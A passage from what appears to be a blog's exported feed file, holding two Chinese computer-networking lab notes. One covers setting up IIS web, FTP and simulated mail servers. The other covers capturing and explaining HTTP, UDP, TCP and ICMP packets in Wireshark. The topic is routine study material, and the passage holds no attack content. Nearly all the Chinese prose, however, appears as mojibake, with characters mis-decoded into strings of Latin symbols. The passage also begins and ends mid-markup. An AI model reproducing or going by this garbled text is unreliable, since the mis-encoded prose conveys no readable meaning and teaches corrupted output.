class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span></span><br><span class="line">        My frrst Page!</span><br><span class="line">    <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p1</span>&gt;</span>Hello World!<span class="tag">&lt;/<span class="name">p1</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">p1</span>&gt;</span>è¿™æ˜¯æˆ‘ç¬¬ä¸€ä¸ªWebæœåŠ¡å™¨<span class="tag">&lt;/<span class="name">p1</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨æœ¬æœºæµè§ˆå™¨ç›®å½•ä¸‹è¾“å…¥å¯¹åº”çš„IPåœ°å€ä¹Ÿå°±æ˜¯åˆšåˆšè®¾å®šIPï¼Œæµè§ˆå™¨ä¸Šæœ‰å›æ˜¾å†…å®¹<br><img src="https://s1.ax1x.com/2018/07/20/P3oyiF.png" alt="P3oyiF.png"></p><h3 id="å®éªŒå†…å®¹äºŒ"><a href="#å®éªŒå†…å®¹äºŒ" class="headerlink" title="å®éªŒå†…å®¹äºŒ"></a>å®éªŒå†…å®¹äºŒ</h3><p><strong>WebServeçš„é…ç½®è®¾è®¡</strong><br>ä¸Šç½‘éšä¾¿ä¸‹è½½ä¸€ä¸ªASPæºç ï¼Œç„¶åæ”¾åœ¨æ‰€è®¾å®šçš„ç½‘é¡µç›®å½•ä¸‹ï¼Œè®¾ç½®é»˜è®¤ç½‘ç«™è®¿é—®index.html,é…ç½®çš„ç›¸å…³ä¿¡æ¯ï¼Œæ­¥éª¤è·Ÿä¸Šé¢é…ç½®IISæœåŠ¡å™¨å·®ä¸å¤š<br><img src="https://s1.ax1x.com/2018/07/20/P3o7Je.png" alt="P3o7Je.png"><br>æœ¬æœºè®¿é—®219.219.68.183:8080,æµè§ˆå™¨æœ‰å›æ˜¾<br><a href="https://imgchr.com/i/P3oHRH" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3oHRH.md.png" alt="P3oHRH.md.png"></a></p><p><strong>FTPServerçš„é…ç½®è®¾è®¡</strong><br>FTPæœåŠ¡çš„å¼€å¯è·ŸIISçš„å¼€å¯æœ‰ç‚¹ç±»ä¼¼ï¼Œä»æ§åˆ¶é¢æ¿é‡Œé¢æ‰¾åˆ°ç¨‹åºç„¶åå»é€‰æ‹©æ‰“å¼€æˆ–å…³é—­windowsåŠŸèƒ½ï¼Œé€‰æ‹©FTPæœåŠ¡å™¨çš„é€‰é¡¹<br><img src="https://s1.ax1x.com/2018/07/20/P3oXLt.png" alt="P3oXLt.png"></p><p>ç„¶åå°±å¼€å§‹é…ç½®FTPæœåŠ¡å™¨ï¼Œé€‰ä¸­ä¸€ä¸ªç›®å½•ç”¨æ¥å­˜æ”¾ä½ æä¾›è®¿é—®ä»¥åŠä¸‹è½½çš„æ–‡ä»¶<br>ç”µè„‘çš„Cç›˜ä¸‹è®¾ç½®C:\FTPï¼Œè¯¥ç›®å½•ä¸‹æœ‰å¾ˆå¤šå­ç›®å½•ä¾›è®¿é—®ï¼Œä¸Šä¼ å’Œä¸‹è½½ã€‚<br>ç„¶ååœ¨IISç®¡ç†å™¨é‡Œé¢æ–°å»ºä¸€ä¸ªFTPç«™ç‚¹ï¼Œç„¶åè®¾ç½®ç›¸å…³çš„ä¿¡æ¯<br><img src="https://s1.ax1x.com/2018/07/20/P3oveP.png" alt="P3oveP.png"><br><img src="https://s1.ax1x.com/2018/07/20/P3oxdf.png" alt="P3oxdf.png"></p><p>ç„¶åè®¾ç½®èº«ä»½ä¿¡æ¯è¿˜æœ‰æƒé™ï¼Œè®¾ç½®åŒ¿åç”¨æˆ·çš„è¯å°±å…è®¸å…¶ä»–äººè®¿é—®äº†ï¼Œå¦‚æœæœ‰ç‰¹æ®Šè¦æ±‚å†è®¾ç½®å…¶ä»–ç”¨æˆ·ç±»å‹ï¼Œç‚¹å‡»å®Œæˆå°±å¯ä»¥å¼€å¯è¯¥æœåŠ¡äº†<br><img src="https://s1.ax1x.com/2018/07/20/P3TFQs.png" alt="P3TFQs.png"></p><p>åœ¨æœ¬æœºæµè§ˆå™¨ä¸Šè¾“å…¥è‡ªå·±è®¾å®šçš„ip,è¾“å…¥<code>ftp://219.219.61.183,</code>æµè§ˆå™¨ä¸Šæ˜¾ç¤ºç›®æ ‡æ–‡ä»¶å¤¹å†…çš„æ‰€æœ‰æ–‡ä»¶ï¼Œå¹¶æ”¯æŒä¸‹è½½ï¼Œå¦‚å›¾<br><a href="https://imgchr.com/i/P3Tkyn" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3Tkyn.md.png" alt="P3Tkyn.md.png"></a></p><p><strong>SMTPæœåŠ¡å™¨çš„é…ç½®</strong><br>è¿™é‡ŒåŸæœ¬çš„é…ç½®åŸæœ¬æ˜¯æƒ³ç›´æ¥åœ¨windowsä¸Šé¢å®ç°çš„ï¼Œéƒ½æ˜¯åæ¥å‘ç°äº†ä¸€ç§æ›´å¥½çš„æ–¹å¯ä»¥ç”¨æ€ç§‘è¿™æ¬¾å·¥å…·å®Œæˆï¼Œå…¶å®ä¸Šé¢çš„å®éªŒä¹Ÿå¯ä»¥ç›´æ¥æ¨¡ä»¿ï¼Œç½‘ç»œæ‹“æ‰‘å›¾å°±æ˜¯ä¸‹é¢çš„ç»“æ„ï¼Œ<br><a href="https://imgchr.com/i/P3TZwV" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3TZwV.md.png" alt="P3TZwV.md.png"></a><br>ä½†æ˜¯å°±å•å•é…ç½®é‚®ç®±æœåŠ¡å™¨çš„è¯ï¼Œæˆ‘å°±æŠŠæ‹“æ‰‘å›¾ç®€åŒ–ï¼Œå½¢æˆä¸‹é¢çš„æ‹“æ‰‘å›¾ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯åœ¨æ²¡æœ‰DHCPæœåŠ¡å™¨çš„çš„æƒ…å†µä¸‹ï¼Œéœ€è¦è‡ªå·±é™æ€å»é…ç½®IPåœ°å€ï¼ŒåŸŸåæœåŠ¡å™¨ä¿ç•™<br><img src="https://s1.ax1x.com/2018/07/20/P3TeoT.png" alt="P3TeoT.png"></p><p>PC1è¿˜æœ‰PC2ä¸¤å°æœºå­çš„IPè®¾ç½®å¦‚ä¸‹ï¼Œè¿˜æœ‰MAILå’ŒDNSæœåŠ¡å™¨çš„IPåœ°å€è®¾ç½®<br><img src="https://s1.ax1x.com/2018/07/20/P37Gcj.png" alt="P37Gcj.png"><br><img src="https://s1.ax1x.com/2018/07/20/P37Jjs.png" alt="P37Jjs.png"><br><img src="https://s1.ax1x.com/2018/07/20/P37tun.png" alt="P37tun.png"><br><img src="https://s1.ax1x.com/2018/07/20/P37NBq.png" alt="P37NBq.png"><br>ç„¶åå†é…ç½®DNSæœåŠ¡å™¨é‡Œé¢çš„ç›¸å…³åŸŸåï¼Œå…¶ä»–æ— ç”¨çš„æœåŠ¡æˆ‘ä»¬å¯ä»¥å…³æ‰<br><a href="https://imgchr.com/i/P37wNT" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P37wNT.md.png" alt="P37wNT.md.png"></a><br>ç„¶åé…ç½®é‚®ç®±æœåŠ¡å™¨ï¼Œæ³¨æ„è¿™é‡Œè¦é…ç½®çš„ä¸¤ä¸ªç”¨æˆ·åä¸å¯†ç è·Ÿåé¢PC1å’ŒPC2é…ç½®çš„è¦ä¸€è‡´ã€‚æˆ‘è¿™é‡Œè®¾ç½®çš„æ˜¯test1å’Œtest2<br><a href="https://imgchr.com/i/P37DCF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P37DCF.md.png" alt="P37DCF.md.png"></a><br>ç„¶ååœ¨PC1å’ŒPC2é‡Œé¢é…ç½®ç›¸å¯¹åº”é‚®ä»¶ä¿¡æ¯ï¼Œè¿™æ—¶å€™ä¸Šé¢é…ç½®çš„ç”¨æˆ·åå°±æœ‰ç”¨äº†<br><img src="https://s1.ax1x.com/2018/07/20/P37sgJ.png" alt="P37sgJ.png"><br><img src="https://s1.ax1x.com/2018/07/20/P37yv9.png" alt="P37yv9.png"><br>ç‚¹å‡»PC1é‚®ä»¶åŠŸèƒ½é‡Œé¢çš„composeç¼–è¾‘å‘é€é‚®ä»¶çš„ä¿¡æ¯ï¼Œç„¶åSend<br><a href="https://imgchr.com/i/P37cuR" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P37cuR.md.png" alt="P37cuR.md.png"></a></p><p>ä»receiveé‡ŒæŸ¥çœ‹æ¥å—çš„ä¿¡æ¯ï¼Œæ”¶åˆ°åˆšæ‰å‘é€çš„ä¿¡æ¯äº†<br><img src="https://s1.ax1x.com/2018/07/20/P37gD1.png" alt="P37gD1.png"><br>åŒç†ï¼ŒPC2ä¹Ÿèƒ½åŒæ ·çš„æ¥å—å‘é€ä¿¡æ¯</p><h3 id="å®éªŒå†…å®¹ä¸‰"><a href="#å®éªŒå†…å®¹ä¸‰" class="headerlink" title="å®éªŒå†…å®¹ä¸‰"></a>å®éªŒå†…å®¹ä¸‰</h3><p>æ‰‹æœºè®¿é—®Webserverï¼Œä¹Ÿå°±æ˜¯219.219.68.183:8080,æ‰‹æœºä¸Šå›æ˜¾ç½‘é¡µä¿¡æ¯ï¼Œæ­å»ºæˆåŠŸ<br><img src="https://s1.ax1x.com/2018/07/20/P372Hx.jpg" alt="P372Hx.jpg"></p><p>åŒæ ·æ‰‹æœºè®¿é—®FTPserverï¼Œå¡«å†™å¥½ä¿¡æ¯,æ‰‹æœºä¸Šå›æ˜¾ç½‘é¡µä¿¡æ¯ï¼Œè¿æ¥æˆåŠŸ<br><a href="https://imgchr.com/i/P37WE6" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P37WE6.md.png" alt="P37WE6.md.png"></a><br>å¯¹äºé‚®ç®±æœåŠ¡å™¨ç”¨PC1è·ŸPC2äº’ç›¸å‘é€é‚®ä»¶:<br><a href="https://imgchr.com/i/P375CD" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P375CD.md.png" alt="P375CD.md.png"></a><br><a href="https://imgchr.com/i/P37I8e" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P37I8e.md.png" alt="P37I8e.md.png"></a><br>ä¸¤å°æœºå­éƒ½èƒ½å¤Ÿäº’ç›¸æ¥æ”¶é‚®ä»¶ï¼ŒæˆåŠŸéªŒè¯</p><h2 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h2><p>çªç„¶å‘ç°ä»¿çœŸè½¯ä»¶çœŸçš„æ˜¯å¼ºå¤§ï¼Œæœ¬æ¥è¿˜æ˜¯æƒ³åœ¨win7çš„æœºå­ä¸Šç›´æ¥æ¨¡æ‹Ÿçš„é‚®ç®±æœåŠ¡å™¨ï¼Œå‘ç°æ­»æ´»éƒ½ä¸è¡Œï¼Œæ²¡æƒ³åˆ°ä»¿çœŸè½¯ä»¶è¿˜èƒ½è¿™æ ·ç©ï¼Œè‡ªå·±è¿˜æ˜¯å¤ªèœï¼Œå•¥éƒ½ä¸çŸ¥é“ã€‚ã€‚ã€‚ã€‚å…³äºé‚®ä»¶ï¼Œsmtpåè®®åªæ˜¯ä¸€ä¸ªå‘é€çš„åè®®ï¼Œæ¥æ”¶é‚®ä»¶çš„æ—¶å€™ç”¨çš„å¯æ˜¯popä»¥åŠimapåè®®ï¼Œè¿™è¿˜æ˜¯è¦æ³¨æ„ä¸€ä¸‹çš„ï¼Œä¸è¿‡ç°åœ¨çš„å‘é‚®ä»¶éƒ½æ˜¯è¢«httpå°è£…çš„ï¼Œä¹Ÿå°±æ˜¯ç›´æ¥ä»webé‡Œé¢ç›´æ¥å®Œæˆæ“ä½œï¼Œå³ä½¿æ”¹å˜äº†UAåˆ°æœåŠ¡å™¨é‚£ä¸€æ®µï¼Œä½†æ˜¯ä¸¤ä¸ªé‚®ç®±æœåŠ¡å™¨ä¹‹é—´ä¼ è¾“çš„åè®®è¿˜æ˜¯æ²¡æœ‰å˜çš„ï¼Œä¾æ—§æ˜¯smtpã€‚ã€‚ã€‚</p><p>æ”¾æš‘å‡äº†å•Šï¼ï¼ï¼</p>]]></content>
      
      <categories>
          
          <category> è®¡ç®—æœºç½‘è·¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è®¡ç®—æœºç½‘è·¯ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>è®¡ç½‘å®éªŒç¬”è®°(ä¸€)</title>
      <link href="/comp-net-1.html"/>
      <url>/comp-net-1.html</url>
      <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æ€»ç®—æœ‰æ—¶é—´æŠŠè®¡ç½‘å®éªŒçš„å­¦ä¹ è¿‡ç¨‹è®°å½•ä¸€ä¸‹äº†ã€‚ä¹Ÿå½“åšæ˜¯ä¸€ä¸ªå¤ä¹ çš„è¿‡ç¨‹ï¼Œè¿‡ç¨‹å¤ªé•¿ï¼Œåˆ†ä¸¤ç¯‡åšå®¢å†™å§ã€‚<br><a id="more"></a></p><h2 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h2><p>è¿™ä¸€ç¯‡æ˜¯å¯¹åè®®æŠ¥æ–‡çš„åˆ†æï¼Œè¿™é‡Œé¢æœ‰å¯¹Wiresharkçš„ä½¿ç”¨ï¼Œåªèƒ½è¯´æˆ‘å¯¹äºWiresharkè¿™æ¬¾è½¯ä»¶çš„ä½¿ç”¨è¿˜æ˜¯æ¸£ã€‚å„ç§ipåœ°å€çš„è¿‡æ»¤ä»¥åŠå¦‚ä½•å»åˆ©ç”¨Wiresharkå¼ºå¤§çš„æœç´¢åŠŸèƒ½è¿™é‡Œå°±ä¸å¤šè¯´äº†ã€‚ä¸ªäººæ„Ÿè§‰æœ€å¥½çš„æ–¹æ³•å°±æ˜¯åœ¨CTFé‡Œé¢çš„æµé‡åˆ†æé¢˜ç›®é‡Œå­¦ï¼Œåœ¨CTFçš„æµé‡åˆ†æé¢˜ç›®é‡Œé¢ä½ ä¼šç»å¸¸è§¦ç¢°åˆ°é‚£ç§è¦å¯¼å‡ºæ–‡ä»¶å›¾ç‰‡ï¼Œå¯¼è¿›ç§˜é’¥è§£å¯†httpsçš„å„ç§ç±»å‹é¢˜ï¼Œæ„Ÿè§‰å­¦çš„ä¼šæ›´å¿«ã€‚</p><p>ä¸å¤šè¯´åºŸè¯ä¸‹é¢ä¸Šè¯¾å®éªŒçš„å†…å®¹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ï¼ˆ1ï¼‰ è¿ç”¨æŠ“åŒ…å·¥å…·ï¼Œåˆ†åˆ«è·å–ä¸åŒäº’è”ç½‘è®¿é—®æƒ…å½¢ä¸‹çš„æœ¬æœºç½‘å¡æ•°æ®åŒ…ï¼›è¿‡æ»¤æ•è·å’Œè¿‡æ»¤æ˜¾ç¤ºä¸åŒæ¡ä»¶çš„æ•°æ®åŒ…ã€‚</span><br><span class="line">ï¼ˆ2ï¼‰åˆ†åˆ«å¯¹ä¸åŒäº’è”ç½‘è®¿é—®æƒ…å½¢ä¸‹çš„æ•°æ®åŒ…è¿›è¡Œé€å±‚åˆ†æï¼Œç»™å‡ºå„å±‚åè®®çš„ä¸»è¦å‚æ•°åŠæ„ä¹‰ï¼›è¦æ±‚åˆ†åˆ«è·å–WWWæœåŠ¡ã€EmailæœåŠ¡ã€QQé€šä¿¡å’Œè¿…é›·æ–‡ä»¶ä¸‹è½½å››ç§ä¸åŒç½‘ç»œæœåŠ¡è¿‡ç¨‹ä¸­çš„æ•°æ®åŒ…ã€‚</span><br><span class="line">ï¼ˆ3ï¼‰è¿ç”¨æŠ“åŒ…å·¥å…·ï¼Œè¿ç»­è·å–é¢å‘è¿æ¥çš„äº’è”ç½‘è®¿é—®æƒ…å½¢ä¸‹çš„æœ¬æœºç½‘å¡æ•°æ®åŒ…ï¼›å¯¹è¿ç»­è·å–çš„æ•°æ®åŒ…æ‰¾åˆ°æ‰§è¡Œé¢å‘è¿æ¥è¿‡ç¨‹çš„æŠ¥æ–‡ï¼Œç»™å‡ºå®ç°é¢å‘è¿æ¥è¿‡ç¨‹ï¼ˆTCPä¸‰æ¬¡æ¡æ‰‹ï¼‰çš„è¯¦ç»†åˆ†æã€‚</span><br></pre></td></tr></table></figure></p><h3 id="å®éªŒå†…å®¹ç¬¬ä¸€ç‚¹"><a href="#å®éªŒå†…å®¹ç¬¬ä¸€ç‚¹" class="headerlink" title="å®éªŒå†…å®¹ç¬¬ä¸€ç‚¹"></a>å®éªŒå†…å®¹ç¬¬ä¸€ç‚¹</h3><p><strong>httpåè®®</strong><br>å…³äºè¿™ä¸ªåè®®ï¼Œä¸ªäººç†è§£æ˜¯ä¸‡ç»´ç½‘çš„æœåŠ¡åè®®ï¼Œé»˜è®¤ç«¯å£æ˜¯80ç«¯å£ï¼Œè¿è¾“å±‚ä½¿ç”¨çš„æ˜¯å¯é çš„TCPï¼Œä¸è¿‡ç°åœ¨ä¹Ÿæœ‰å®ƒçš„åŠ å¯†ç‰ˆæœ¬httpsï¼Œä¹Ÿå°±æ˜¯åœ¨httpçš„åŸºç¡€ä¸Šå¢åŠ äº†sslå»åŠ å¯†ï¼Œé»˜è®¤ç«¯å£æ˜¯443ï¼Œæ‰€ä»¥åœ¨æˆ‘ä»¬éœ€è¦è§£å¯†å«æœ‰httpsçš„æŠ¥æ–‡çš„æ—¶å€™ï¼Œæƒ³æŸ¥çœ‹æ›´å¤šçš„ä¿¡æ¯ï¼Œåº”è¯¥è¿½è¸ªhttpæµè€Œä¸åº”è¯¥è¿½è¸ªtcpï¼Œåˆ°è¿è¾“å±‚çš„æ—¶å€™å·²ç»åŠ å¯†äº†ï¼Œçœ‹ä¸å‡ºå•¥ä¸œè¥¿çš„ï¼Œæˆ‘è®°å¾—DDCTFé‡Œé¢æœ‰ä¸€é“æµé‡åˆ†æçš„é¢˜ç›®å°±æ˜¯è¿™æ ·çš„ï¼Œé‡Œé¢å¯ä»¥å¯¼å‡ºä¸€ä¸ªå›¾ç‰‡ç„¶åè¿ç”¨çš„æ˜¯ocræŠŠç§˜é’¥æå–å‡ºæ¥ã€‚ç¡®å®æœ‰ç‚¹çƒ¦ï¼Œocrè¿™ä¸œè¥¿ä¸å‡†ã€‚å¯¹äºWiresharké‡Œé¢çš„åˆ†ç»„ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥è¿‡æ»¤httpå°±å¯ä»¥è·å¾—å•¦ï¼Œå‰ææ˜¯è®°å¾—è®¿é—®httpçš„é¡µé¢ï¼Œåˆ«è®¿é—®httpsçš„é¡µé¢ï¼Œ233333ï¼Œä¸ç„¶ä½ åªèƒ½é¡¾è™‘çš„æ˜¯httpsäº†ã€‚</p><p><a href="https://imgchr.com/i/P3dftU" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/19/P3dftU.md.png" alt="P3dftU.md.png"></a></p><p><strong>UDPåè®®</strong><br>UDPåè®®æ˜¯é¢å‘æŠ¥æ–‡çš„ä¸€ç§åè®®ï¼Œå¦‚æœä½ è§‚å¯Ÿä»–çš„å°è£…ï¼Œä½ ä¼šå‘ç°å®¢æˆ·ç»™ä»–ä»€ä¹ˆæ•°æ®ä»–å°±ç›´æ¥å°è£…ç½‘ä¸‹å±‚IPå±‚é€å»ï¼Œä¸åƒTCPä¸€æ ·ä¼šæœ‰æ—¶å€™ä¼šå¯¹æŠ¥æ–‡çš„è¿›è¡Œåˆ†ç»„å¤„ç†ï¼Œæ‰€ä»¥ä¸€èˆ¬UDPéƒ½æ˜¯ä¸å¯é ï¼Œæ— è¿æ¥çš„ï¼Œé™¤éä¸Šå±‚çš„åº”ç”¨ç¨‹åºæ‰¿æ‹…äº†æ£€é”™çš„ä»»åŠ¡ï¼Œæ‰€ä»¥UDPåè®®è¿½æ±‚çš„æ˜¯æ•ˆç‡ï¼Œä¸€èˆ¬éƒ½ç”¨åœ¨è§†é¢‘è¯­éŸ³ä¸Šäº†ã€‚æˆ‘ä»¬åœ¨æŠ“åŒ…çš„æ—¶å€™ç›´æ¥ä½¿ç”¨udpå°±å¯ä»¥è¿‡æ»¤ç½‘ç»œä¸­çš„udpç”¨æˆ·æ•°æ®æŠ¥æ–‡äº†ã€‚</p><p><a href="https://imgchr.com/i/P30lMd" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/19/P30lMd.md.png" alt="P30lMd.md.png"></a></p><p><strong>TCPåè®®</strong><br>TCPåè®®æ˜¯æ˜¯ä¸€ç§é¢å‘å­—èŠ‚æµï¼Œå¯é ï¼Œé¢å‘è¿æ¥çš„åè®®ï¼Œä»–å¯¹äºç”¨æˆ·ä¼ é€çš„æŠ¥æ–‡å¯ä»¥è¿›è¡Œåˆ†ç»„å½¢æˆæŠ¥æ–‡æ®µï¼Œå…¶ä¸­åè®®ä¸­å¦‚ä½•ä¿è¯ä¼ è¾“çš„æ­£ç¡®æ€§ï¼Œå¦‚ä½•è¿›è¡Œæ‹¥å¡æ§åˆ¶ï¼Œå¦‚ä½•è¿›è¡Œè¿æ¥çš„å»ºç«‹ä»¥åŠé‡Šæ”¾éƒ½æ˜¯é‡ç‚¹ï¼Œä¸ºäº†å¤ä¹ ï¼Œè¿˜æ˜¯å›é¡¾ä¸€ä¸‹å§ï¼Œå…¶ä¸­ä¿è¯ä¼ è¾“çš„æ­£ç¡®æ€§çª—å£(çª—å£çš„æ¦‚å¿µå°±ä¸å¤šè®²äº†)çš„ä½œç”¨è‡³å…³é‡è¦ï¼Œå…¶ä¸­æœ€ä¸ºé‡è¦çš„æ˜¯å…¶ä¸­çš„ARQåè®®(è‡ªåŠ¨é‡ä¼ åè®®)ï¼Œå¯¹äºæ‹¥å¡æ§åˆ¶ï¼Œæœ€é‡è¦çš„è¿˜æ˜¯é‚£å››ä¸ªç®—æ³•ï¼Œæ…¢å¼€å§‹ï¼Œæ‹¥å¡é¿å…ï¼Œå¿«é‡ä¼ ï¼Œå¿«æ¢å¤ï¼Œå…³é”®ç‚¹å°±åœ¨æ‹¥å¡çª—å£å€¼ä»¥åŠé—¨é™å€¼çš„å˜åŒ–å¹¶ä¸”åœ¨ä¸åŒæƒ…å†µä¸‹ä½¿ç”¨çš„ç®—æ³•ä¹Ÿä¸ä¸€æ ·ï¼Œæ…¢å¼€å§‹æ˜¯ä½¿ç”¨åœ¨ä¸€å¼€å§‹çš„æ—¶å€™ä»¥åŠå‘ç°è¶…æ—¶çš„æ—¶å€™ä½¿ç”¨çš„ï¼Œè€Œå¿«é‡ä¼ ï¼Œå¿«æ¢å¤æ˜¯åœ¨åœ¨è¶…æ—¶è®¡æ•°å™¨ç»“æŸå‰è¿ç»­æ”¶åˆ°ä¸‰ä¸ªå“åº”æŠ¥æ–‡ä½¿ç”¨çš„ã€‚åœ¨è¿‡æ»¤çš„æ—¶å€™æˆ‘ä»¬åªéœ€è¦ç”¨tcpå‘½ä»¤å°±å¯æŠŠTCPæŠ¥æ–‡ç»™æ»¤å‡ºæ¥äº†ã€‚</p><p><a href="https://imgchr.com/i/P30YIf" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/19/P30YIf.md.png" alt="P30YIf.md.png"></a></p><p><strong>ICMPåè®®</strong><br>ICMPåè®®æ˜¯ä¸€ç§ç”¨äºæŠ¥å‘Šé”™è¯¯ä¿¡æ¯çš„åè®®ï¼Œä½äºIPå±‚ï¼Œæˆ‘ä»¬å¹³å¸¸ä½¿ç”¨çš„pingï¼Œtracertå‘½ä»¤éƒ½æ˜¯å±äºè¿™ä¸€åè®®é‡Œé¢çš„ï¼Œè¿™ä¸¤ä¸ªå‘½ä»¤éƒ½ååˆ†å¸¸ç”¨ï¼Œpingç”¨äºåŠé’ ç›ç½‘ç»œæ˜¯å¦è¿é€šï¼Œè€Œæ˜¯ç”¨tracertå‘½ä»¤æˆ‘ä»¬å¯ä»¥æ¢æµ‹å‡ºç½‘ç»œæ‹“æ‰‘ç»“æ„ï¼Œæ‰€ä»¥è¦æŠ“åˆ°icmpçš„æŠ¥æ–‡ï¼Œåªéœ€è¦pingä¸€ä¸‹ç„¶ååœ¨Wiresharké‡Œé¢ç”¨icmpè¿™ä¸€ä¸ªå‘½ä»¤è¿‡æ»¤å‡ºæ¥å³å¯ã€‚<br><a href="https://imgchr.com/i/P32ksU" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P32ksU.md.png" alt="P32ksU.md.png"></a></p><h3 id="å®éªŒå†…å®¹ç¬¬äºŒç‚¹"><a href="#å®éªŒå†…å®¹ç¬¬äºŒç‚¹" class="headerlink" title="å®éªŒå†…å®¹ç¬¬äºŒç‚¹"></a>å®éªŒå†…å®¹ç¬¬äºŒç‚¹</h3><p>å…ˆæŠŠå„éƒ¨åˆ†çš„åŒ…çš„å…ˆè¿‡æ»¤å‡ºæ¥</p><p><strong>WWWæœåŠ¡æ•°æ®åŒ…:</strong><br><a href="https://imgchr.com/i/P3RwN9" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3RwN9.md.png" alt="P3RwN9.md.png"></a><br><strong>EmailæœåŠ¡æ•°æ®åŒ…:</strong><br><a href="https://imgchr.com/i/P3Rlhn" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3Rlhn.md.png" alt="P3Rlhn.md.png"></a><br><strong>QQé€šä¿¡æ•°æ®åŒ…:</strong><br><a href="https://imgchr.com/i/P3R0hR" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3R0hR.md.png" alt="P3R0hR.md.png"></a></p><p><strong>è¿…é›·æ–‡ä»¶ä¸‹è½½æœåŠ¡æ•°æ®åŒ…:</strong><br><a href="https://imgchr.com/i/P3RqHg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3RqHg.md.png" alt="P3RqHg.md.png"></a></p><p>ä¸åŒäº’è”ç½‘è®¿é—®æƒ…å½¢ä¸‹çš„æ•°æ®åŒ…è¿›è¡Œé€å±‚åˆ†æï¼Œå…ˆPacket Details Pane(å°åŒ…è¯¦ç»†ä¿¡æ¯)æœ‰å¤§è‡´ç†è§£, æ˜¾ç¤ºå°åŒ…ä¸­çš„å­—æ®µï¼Œå„è¡Œä¿¡æ¯è¯´æ˜å¦‚ä¸‹ï¼š</p><ol><li>Frame:  ç‰©ç†å±‚çš„æ•°æ®å¸§æ¦‚å†µ(è¿™æ˜¯æœ€åº•å±‚çš„ï¼Œä¸€èˆ¬ä»¥æ¯”ç‰¹æµä¼ é€ï¼Œçœ‹ä¸æ‡‚)</li><li>Ethernet II:  æ•°æ®é“¾è·¯å±‚ä»¥å¤ªç½‘å¸§å¤´éƒ¨ä¿¡æ¯ï¼Œ</li><li>Internet Protocol Version 4:  äº’è”ç½‘å±‚IPåŒ…å¤´éƒ¨ä¿¡æ¯</li><li>Transmission Control Protocol:  ä¼ è¾“å±‚Tçš„æ•°æ®æ®µå¤´éƒ¨ä¿¡</li><li>Hypertext Transfer Protocol:  åº”ç”¨å±‚çš„ä¿¡æ¯</li></ol><p><strong>UDPæ•°æ®åŒ…è¯¦ç»†åˆ†æï¼š</strong><br><a href="https://imgchr.com/i/P3W85d" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3W85d.md.png" alt="P3W85d.md.png"></a><br>è¿™ä¸ªæ•°æ®åŒ…çš„è¯¦ç»†ä¿¡æ¯é‡Œé¢åŒ…å«äº†ç‰©ç†å±‚(Frameé‚£ä¸€è¡Œ)ï¼Œæ•°æ®é“¾è·¯å±‚(Etherneté‚£ä¸€è¡Œ)ï¼Œç½‘è·¯å±‚(Internet Protocolé‚£ä¸€è¡Œ)ï¼Œä¼ è¾“å±‚(User Datagram Protocolé‚£ä¸€è¡Œ)è¿˜æœ‰åº”ç”¨å±‚æ•°æ®ï¼Œå±‚æ¬¡ç»“æ„ååˆ†æ˜æ˜¾ã€‚<br>ä»UDPçš„æŠ¥æ–‡æ ¼å¼å¯ä»¥å¾—åˆ°UDPçš„é¦–éƒ¨ä¿¡æ¯ï¼Œæºç«¯å£ä¸º4026ï¼Œç›®çš„ç«¯å£ä¸º8000ï¼ŒUDPé•¿åº¦ä¸º55ï¼Œæ£€éªŒå’Œä¸º0x4362<br><a href="https://imgchr.com/i/P3hE11" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3hE11.md.png" 